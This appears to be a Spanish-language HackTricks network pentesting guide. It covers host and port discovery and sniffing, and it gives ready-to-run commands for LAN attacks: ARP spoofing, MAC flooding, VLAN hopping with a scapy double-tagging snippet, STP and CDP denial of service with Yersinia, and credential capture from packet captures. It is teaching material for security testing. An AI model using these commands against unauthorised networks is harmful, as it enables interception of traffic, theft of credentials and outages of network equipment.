# Pentesting de Red

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Consejo de recompensa por errores**: **Reg√≠strate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¬°√önete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Descubriendo hosts desde el exterior

Esta ser√° una **secci√≥n breve** sobre c√≥mo encontrar **IPs que responden** desde **Internet**.\
En esta situaci√≥n tienes alg√∫n **rango de IPs** (quiz√°s incluso varios **rangos**) y solo necesitas encontrar **qu√© IPs est√°n respondiendo**.

### ICMP

Esta es la forma **m√°s f√°cil** y **r√°pida** de descubrir si un host est√° activo o no.\
Podr√≠as intentar enviar algunos paquetes **ICMP** y **esperar respuestas**. La forma m√°s sencilla es simplemente enviar una **solicitud de eco** y esperar la respuesta. Puedes hacerlo usando un simple `ping` o usando `fping` para **rangos**.\
Tambi√©n podr√≠as usar **nmap** para enviar otros tipos de paquetes ICMP (esto evitar√° filtros para la solicitud-respuesta de eco ICMP com√∫n).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Descubrimiento de Puertos TCP

Es muy com√∫n encontrar que todos los tipos de paquetes ICMP est√°n siendo filtrados. Entonces, todo lo que puedes hacer para verificar si un host est√° activo es **intentar encontrar puertos abiertos**. Cada host tiene **65535 puertos**, por lo tanto, si tienes un alcance "grande" **no puedes** probar si **cada puerto** de cada host est√° abierto o no, eso tomar√≠a demasiado tiempo.\
Entonces, lo que necesitas es un **esc√°ner de puertos r√°pido** ([masscan](https://github.com/robertdavidgraham/masscan)) y una lista de los **puertos m√°s utilizados:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### Descubrimiento de Puertos HTTP

Esto es simplemente un descubrimiento de puertos TCP √∫til cuando deseas **centrarte en descubrir servicios HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Descubrimiento de Puertos UDP

Tambi√©n podr√≠as intentar verificar si hay alg√∫n **puerto UDP abierto** para decidir si deber√≠as **prestar m√°s atenci√≥n** a un **host**. Dado que los servicios UDP generalmente **no responden** con **ning√∫n dato** a un paquete de sonda UDP vac√≠o regular, es dif√≠cil decir si un puerto est√° siendo filtrado o abierto. La forma m√°s f√°cil de decidir esto es enviar un paquete relacionado con el servicio en ejecuci√≥n, y como no sabes qu√© servicio est√° en ejecuci√≥n, deber√≠as probar el m√°s probable basado en el n√∫mero de puerto:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La l√≠nea de nmap propuesta anteriormente probar√° los **principales 1000 puertos UDP** en cada host dentro del rango **/24**, pero incluso solo esto llevar√° **>20min**. Si necesita **resultados m√°s r√°pidos**, puede usar [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Esto enviar√° estas **sondas UDP** a su **puerto esperado** (para un rango /24 esto solo tomar√° 1 minuto): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Descubrimiento de puertos SCTP
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Aqu√≠ puedes encontrar una gu√≠a completa de todos los ataques Wifi conocidos en el momento de la escritura:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Descubriendo hosts desde el interior

Si est√°s dentro de la red, una de las primeras cosas que querr√°s hacer es **descubrir otros hosts**. Dependiendo de **cu√°nto ruido** puedas o quieras hacer, se pueden realizar diferentes acciones:

### Pasivo

Puedes utilizar estas herramientas para descubrir hosts de forma pasiva dentro de una red conectada:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Activo

Tenga en cuenta que las t√©cnicas comentadas en [_**Descubriendo hosts desde el exterior**_](./#discovering-hosts-from-the-outside) (_Descubrimiento de puertos TCP/HTTP/UDP/SCTP_) tambi√©n se pueden **aplicar aqu√≠**.\
Pero, como est√° en la **misma red** que los otros hosts, puede hacer **m√°s cosas**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### ICMP Activo

Tenga en cuenta que las t√©cnicas comentadas en _Descubriendo hosts desde el exterior_ ([_**ICMP**_](./#icmp)) tambi√©n se pueden **aplicar aqu√≠**.\
Pero, como est√°s en la **misma red** que los otros hosts, puedes hacer **m√°s cosas**:

* Si **haces ping** a una **direcci√≥n de difusi√≥n de subred**, el ping deber√≠a llegar a **cada host** y podr√≠an **responderte**: `ping -b 10.10.5.255`
* Al hacer ping a la **direcci√≥n de difusi√≥n de red**, incluso podr√≠as encontrar hosts dentro de **otras subredes**: `ping -b 255.255.255.255`
* Utiliza las banderas `-PE`, `-PP`, `-PM` de `nmap` para realizar el descubrimiento de hosts enviando respectivamente solicitudes de **eco ICMPv4**, **marca de tiempo** y **m√°scara de subred**: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan se utiliza para **encender** computadoras a trav√©s de un **mensaje de red**. El paquete m√°gico utilizado para encender la computadora es simplemente un paquete donde se proporciona una **MAC Dst** y luego se **repite 16 veces** dentro del mismo paquete.\
Estos tipos de paquetes suelen enviarse en un **ethernet 0x0842** o en un **paquete UDP al puerto 9**.\
Si no se proporciona una **\[MAC]**, el paquete se env√≠a a **difusi√≥n ethernet** (y la MAC de difusi√≥n ser√° la que se repita).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Escaneo de hosts

Una vez que hayas descubierto todas las IPs (externas o internas) que deseas escanear en profundidad, se pueden realizar diferentes acciones.

### TCP

* Puerto **abierto**: _SYN --> SYN/ACK --> RST_
* Puerto **cerrado**: _SYN --> RST/ACK_
* Puerto **filtrado**: _SYN --> \[SIN RESPUESTA]_
* Puerto **filtrado**: _SYN --> mensaje ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Hay 2 opciones para escanear un puerto UDP:

* Enviar un **paquete UDP** y verificar la respuesta _**ICMP unreachable**_ si el puerto est√° **cerrado** (en varios casos, ICMP estar√° **filtrado** por lo que no recibir√°s informaci√≥n si el puerto est√° cerrado o abierto).
* Enviar **datagramas formateados** para provocar una respuesta de un **servicio** (por ejemplo, DNS, DHCP, TFTP, y otros, como se enumeran en _nmap-payloads_). Si recibes una **respuesta**, entonces el puerto est√° **abierto**.

**Nmap** combinar√° **ambas** opciones usando "-sV" (los escaneos UDP son muy lentos), pero ten en cuenta que los escaneos UDP son m√°s lentos que los escaneos TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### Escaneo SCTP

**SCTP (Protocolo de Transmisi√≥n de Control de Secuencia)** est√° dise√±ado para ser utilizado junto con **TCP (Protocolo de Control de Transmisi√≥n)** y **UDP (Protocolo de Datagramas de Usuario)**. Su prop√≥sito principal es facilitar el transporte de datos de telefon√≠a sobre redes IP, reflejando muchas de las caracter√≠sticas de confiabilidad encontradas en **Sistema de Se√±alizaci√≥n 7 (SS7)**. **SCTP** es un componente central de la familia de protocolos **SIGTRAN**, que tiene como objetivo transportar se√±ales SS7 sobre redes IP.

El soporte para **SCTP** es proporcionado por varios sistemas operativos, como **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** y **VxWorks**, lo que indica su amplia aceptaci√≥n y utilidad en el campo de las telecomunicaciones y redes.

Nmap ofrece dos escaneos diferentes para SCTP: _-sY_ y _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasi√≥n de IDS y IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **M√°s opciones de nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Revelaci√≥n de direcciones IP internas

**Los routers, firewalls y dispositivos de red mal configurados** a veces responden a sondas de red utilizando **direcciones de origen no p√∫blicas**. **tcpdump** se puede utilizar para identificar paquetes recibidos de direcciones privadas durante las pruebas. Espec√≠ficamente, en Kali Linux, los paquetes se pueden capturar en la interfaz **eth2**, que es accesible desde Internet p√∫blico. Es importante tener en cuenta que si su configuraci√≥n est√° detr√°s de un NAT o un Firewall, es probable que dichos paquetes sean filtrados.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Al hacer sniffing, puedes aprender detalles de rangos de IP, tama√±os de subred, direcciones MAC y nombres de host al revisar tramas y paquetes capturados. Si la red est√° mal configurada o la infraestructura de conmutaci√≥n est√° bajo estr√©s, los atacantes pueden capturar material sensible a trav√©s del sniffing de red pasivo.

Si una red Ethernet conmutada est√° configurada correctamente, solo ver√°s tramas de difusi√≥n y material destinado a tu direcci√≥n MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Uno tambi√©n puede capturar paquetes de una m√°quina remota a trav√©s de una sesi√≥n SSH con Wireshark como la interfaz gr√°fica en tiempo real.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Obviamente.

### Capturando credenciales

Puedes usar herramientas como [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) para analizar credenciales de un archivo pcap o de una interfaz en vivo.

## Ataques en LAN

### ARP spoofing

El ARP Spoofing consiste en enviar respuestas ARP gratuitas para indicar que la IP de una m√°quina tiene la MAC de nuestro dispositivo. Luego, la v√≠ctima cambiar√° la tabla ARP y contactar√° a nuestra m√°quina cada vez que quiera contactar con la IP falsificada.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - Desbordamiento de CAM

Desborde la tabla CAM del switch enviando una gran cantidad de paquetes con diferentes direcciones MAC de origen. Cuando la tabla CAM est√° llena, el switch comienza a comportarse como un concentrador (transmitiendo todo el tr√°fico).
```bash
macof -i <interface>
```
En los switches modernos esta vulnerabilidad ha sido corregida.

### Ataques 802.1Q VLAN / DTP

#### Troncal Din√°mica

El **Protocolo de Troncal Din√°mica (DTP)** est√° dise√±ado como un protocolo de capa de enlace para facilitar un sistema autom√°tico de troncal, permitiendo que los switches seleccionen autom√°ticamente puertos para el modo troncal (Trunk) o modo no troncal. La implementaci√≥n de **DTP** a menudo se considera indicativa de un dise√±o de red sub√≥ptimo, subrayando la importancia de configurar manualmente troncales solo donde sea necesario y garantizar una documentaci√≥n adecuada.

Por defecto, los puertos de switch est√°n configurados para operar en modo Autom√°tico Din√°mico, lo que significa que est√°n listos para iniciar el troncal si son solicitados por un switch vecino. Surge una preocupaci√≥n de seguridad cuando un pentester o atacante se conecta al switch y env√≠a un marco DTP Deseable, obligando al puerto a entrar en modo troncal. Esta acci√≥n permite al atacante enumerar VLAN a trav√©s del an√°lisis de marcos STP y eludir la segmentaci√≥n de VLAN configurando interfaces virtuales.

La presencia de DTP en muchos switches de forma predeterminada puede ser explotada por adversarios para imitar el comportamiento de un switch, obteniendo as√≠ acceso al tr√°fico en todas las VLAN. El script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) se utiliza para monitorear una interfaz, revelando si un switch est√° en modo Predeterminado, Troncal, Din√°mico, Autom√°tico o de Acceso, siendo este √∫ltimo la √∫nica configuraci√≥n inmune a los ataques de salto de VLAN. Esta herramienta eval√∫a el estado de vulnerabilidad del switch.

Si se identifica una vulnerabilidad de red, la herramienta _**Yersinia**_ puede ser utilizada para "habilitar el troncal" a trav√©s del protocolo DTP, permitiendo la observaci√≥n de paquetes de todas las VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Para enumerar las VLANs tambi√©n es posible generar el marco DTP Desirable con el script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. No** interrumpas el script bajo ninguna circunstancia. Inyecta DTP Desirable cada tres segundos. **Los canales de troncales creados din√°micamente en el switch solo permanecen activos durante cinco minutos. Despu√©s de cinco minutos, la troncal se desconecta.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Me gustar√≠a se√±alar que **Acceso/Deseable (0x03)** indica que el marco DTP es del tipo Deseable, lo que indica al puerto que cambie a modo Troncal. Y **802.1Q/802.1Q (0xa5)** indica el tipo de encapsulaci√≥n **802.1Q**.

Al analizar los marcos STP, **aprendemos sobre la existencia de VLAN 30 y VLAN 60**.

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atacando VLANs espec√≠ficas

Una vez que conozcas los valores de las ID de VLAN e IPs, puedes **configurar una interfaz virtual para atacar una VLAN espec√≠fica**.\
Si DHCP no est√° disponible, entonces usa _ifconfig_ para configurar una direcci√≥n IP est√°tica.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Saltador autom√°tico de VLAN

El ataque discutido de **Troncal Din√°mica y creaci√≥n de interfaces virtuales para descubrir hosts dentro** de otras VLAN se **realiza autom√°ticamente** con la herramienta: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Doble Etiquetado

Si un atacante conoce el valor de la **MAC, IP y ID de VLAN del host v√≠ctima**, podr√≠a intentar **etiquetar dos veces un trama** con su VLAN designada y la VLAN de la v√≠ctima y enviar un paquete. Dado que la **v√≠ctima no podr√° conectarse de vuelta** con el atacante, la **mejor opci√≥n para el atacante es comunicarse a trav√©s de UDP** con protocolos que puedan realizar algunas acciones interesantes (como SNMP).

Otra opci√≥n para el atacante es lanzar un **escaneo de puertos TCP suplantando una IP controlada por el atacante y accesible por la v√≠ctima** (probablemente a trav√©s de internet). Luego, el atacante podr√≠a espiar en el segundo host de su propiedad si recibe algunos paquetes de la v√≠ctima.

![](<../../.gitbook/assets/image (190).png>)

Para realizar este ataque, se puede utilizar scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Bypass de Segmentaci√≥n Lateral de VLAN <a href="#d679" id="d679"></a>

Si tienes **acceso a un switch al que est√°s conectado directamente**, tienes la capacidad de **burlar la segmentaci√≥n de VLAN** dentro de la red. Simplemente **cambia el puerto a modo troncal** (tambi√©n conocido como trunk), crea interfaces virtuales con los IDs de las VLANs objetivo y configura una direcci√≥n IP. Puedes intentar solicitar la direcci√≥n de forma din√°mica (DHCP) o configurarla est√°ticamente. Depende del caso.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Bypass de VLAN Privada de Capa 3

En ciertos entornos, como redes inal√°mbricas para invitados, se implementan configuraciones de **aislamiento de puerto (tambi√©n conocido como VLAN privada)** para evitar que los clientes conectados a un punto de acceso inal√°mbrico se comuniquen directamente entre s√≠. Sin embargo, se ha identificado una t√©cnica que puede eludir estas medidas de aislamiento. Esta t√©cnica explota la falta de ACLs de red o su configuraci√≥n incorrecta, lo que permite que los paquetes IP se enrutan a trav√©s de un enrutador para llegar a otro cliente en la misma red.

El ataque se ejecuta creando un **paquete que lleva la direcci√≥n IP del cliente de destino pero con la direcci√≥n MAC del enrutador**. Esto hace que el enrutador reenv√≠e err√≥neamente el paquete al cliente objetivo. Este enfoque es similar al utilizado en los Ataques de Doble Etiquetado, donde la capacidad de controlar un host accesible para la v√≠ctima se utiliza para explotar la falla de seguridad.

**Pasos Clave del Ataque:**

1. **Creaci√≥n de un Paquete:** Se crea un paquete especialmente dise√±ado para incluir la direcci√≥n IP del cliente objetivo pero con la direcci√≥n MAC del enrutador.
2. **Explotaci√≥n del Comportamiento del Enrutador:** El paquete creado se env√≠a al enrutador, que, debido a la configuraci√≥n, redirige el paquete al cliente objetivo, eludiendo el aislamiento proporcionado por la configuraci√≥n de VLAN privada.

### Ataques VTP

VTP (Protocolo de Troncalizaci√≥n de VLAN) centraliza la gesti√≥n de VLAN. Utiliza n√∫meros de revisi√≥n para mantener la integridad de la base de datos de VLAN; cualquier modificaci√≥n incrementa este n√∫mero. Los switches adoptan configuraciones con n√∫meros de revisi√≥n m√°s altos, actualizando sus propias bases de datos de VLAN.

#### Roles del Dominio VTP

* **Servidor VTP:** Gestiona las VLAN: crea, elimina, modifica. Difunde anuncios VTP a los miembros del dominio.
* **Cliente VTP:** Recibe anuncios VTP para sincronizar su base de datos de VLAN. Este rol est√° restringido de realizar modificaciones locales en la configuraci√≥n de VLAN.
* **Transparente VTP:** No participa en actualizaciones VTP pero reenv√≠a anuncios VTP. No se ve afectado por ataques VTP, mantiene un n√∫mero de revisi√≥n constante de cero.

#### Tipos de Anuncios VTP

* **Anuncio Resumido:** Difundido por el servidor VTP cada 300 segundos, llevando informaci√≥n esencial del dominio.
* **Anuncio de Subconjunto:** Enviado despu√©s de cambios en la configuraci√≥n de VLAN.
* **Solicitud de Anuncio:** Emitida por un cliente VTP para solicitar un Anuncio Resumido, t√≠picamente en respuesta a detectar un n√∫mero de revisi√≥n de configuraci√≥n m√°s alto.

Las vulnerabilidades de VTP son explotables exclusivamente a trav√©s de puertos troncales ya que los anuncios VTP circulan √∫nicamente a trav√©s de ellos. Los escenarios de ataque posteriores a DTP pueden dirigirse hacia VTP. Herramientas como Yersinia pueden facilitar los ataques VTP, con el objetivo de eliminar la base de datos de VLAN, interrumpiendo efectivamente la red.

Nota: Esta discusi√≥n se refiere a la versi√≥n 1 de VTP (VTPv1).
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
### Ataques STP

**Si no puedes capturar tramas BPDU en tus interfaces, es poco probable que tengas √©xito en un ataque STP.**

#### **DoS de BPDU STP**

Al enviar una gran cantidad de BPDUs TCP (Notificaci√≥n de Cambio de Topolog√≠a) o Conf (los BPDUs que se env√≠an cuando se crea la topolog√≠a), los switches se sobrecargan y dejan de funcionar correctamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **Ataque TCP STP**

Cuando se env√≠a un TCP, la tabla CAM de los switches se eliminar√° en 15 segundos. Entonces, si est√°s enviando continuamente este tipo de paquetes, la tabla CAM se reiniciar√° continuamente (o cada 15 segundos) y cuando se reinicie, el switch se comportar√° como un concentrador.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **Ataque de Ra√≠z STP**

El atacante simula el comportamiento de un switch para convertirse en la ra√≠z STP de la red. Luego, m√°s datos pasar√°n a trav√©s de √©l. Esto es interesante cuando est√°s conectado a dos switches diferentes.\
Esto se logra enviando paquetes CONF de BPDUs diciendo que el valor de **prioridad** es menor que la prioridad real del switch ra√≠z actual.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Si el atacante est√° conectado a 2 switches, puede ser la ra√≠z del nuevo √°rbol y todo el tr√°fico entre esos switches pasar√° a trav√©s de √©l** (se realizar√° un ataque MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### Ataques CDP

El Protocolo de Descubrimiento CISCO (CDP) es esencial para la comunicaci√≥n entre dispositivos CISCO, permiti√©ndoles **identificarse mutuamente y compartir detalles de configuraci√≥n**.

#### Recolecci√≥n Pasiva de Datos <a href="#id-0e0f" id="id-0e0f"></a>

CDP est√° configurado para transmitir informaci√≥n a trav√©s de todos los puertos, lo que podr√≠a llevar a un riesgo de seguridad. Un atacante, al conectarse a un puerto de switch, podr√≠a desplegar sniffers de red como **Wireshark**, **tcpdump** o **Yersinia**. Esta acci√≥n puede revelar datos sensibles sobre el dispositivo de red, incluyendo su modelo y la versi√≥n de Cisco IOS que ejecuta. El atacante podr√≠a entonces apuntar a vulnerabilidades espec√≠ficas en la versi√≥n identificada de Cisco IOS.

#### Induciendo el Desbordamiento de la Tabla CDP <a href="#id-0d6a" id="id-0d6a"></a>

Un enfoque m√°s agresivo implica lanzar un ataque de Denegaci√≥n de Servicio (DoS) abrumando la memoria del switch, haci√©ndose pasar por dispositivos CISCO leg√≠timos. A continuaci√≥n se muestra la secuencia de comandos para iniciar dicho ataque usando Yersinia, una herramienta de red dise√±ada para pruebas:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante este ataque, la CPU del switch y la tabla de vecinos CDP se ven fuertemente sobrecargadas, lo que conduce a lo que a menudo se denomina **"par√°lisis de red"** debido al consumo excesivo de recursos.

#### Ataque de Suplantaci√≥n de CDP
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Tambi√©n puedes usar [**scapy**](https://github.com/secdev/scapy/). Aseg√∫rate de instalarlo con el paquete `scapy/contrib`.

### Ataques VoIP y la Herramienta VoIP Hopper

Los tel√©fonos VoIP, cada vez m√°s integrados con dispositivos IoT, ofrecen funcionalidades como desbloquear puertas o controlar termostatos a trav√©s de n√∫meros de tel√©fono especiales. Sin embargo, esta integraci√≥n puede plantear riesgos de seguridad.

La herramienta [**voiphopper**](http://voiphopper.sourceforge.net) est√° dise√±ada para emular un tel√©fono VoIP en varios entornos (Cisco, Avaya, Nortel, Alcatel-Lucent). Descubre el ID de VLAN de la red de voz utilizando protocolos como CDP, DHCP, LLDP-MED y 802.1Q ARP.

**VoIP Hopper** ofrece tres modos para el Protocolo de Descubrimiento de Cisco (CDP):

1. **Modo de Sniff** (`-c 0`): Analiza paquetes de red para identificar el ID de VLAN.
2. **Modo de Spoof** (`-c 1`): Genera paquetes personalizados imitando los de un dispositivo VoIP real.
3. **Modo de Spoof con Paquete Predefinido** (`-c 2`): Env√≠a paquetes id√©nticos a los de un modelo de tel√©fono IP Cisco espec√≠fico.

El modo preferido por velocidad es el tercero. Requiere especificar:

* La interfaz de red del atacante (par√°metro `-i`).
* El nombre del dispositivo VoIP que se est√° emulando (par√°metro `-E`), siguiendo el formato de nomenclatura de Cisco (por ejemplo, SEP seguido de una direcci√≥n MAC).

En entornos corporativos, para imitar un dispositivo VoIP existente, uno podr√≠a:

* Inspeccionar la etiqueta MAC en el tel√©fono.
* Navegar por la configuraci√≥n de la pantalla del tel√©fono para ver la informaci√≥n del modelo.
* Conectar el dispositivo VoIP a una computadora port√°til y observar las solicitudes CDP utilizando Wireshark.

Un ejemplo de comando para ejecutar la herramienta en el tercer modo ser√≠a:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### Ataques DHCP

#### Enumeraci√≥n
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
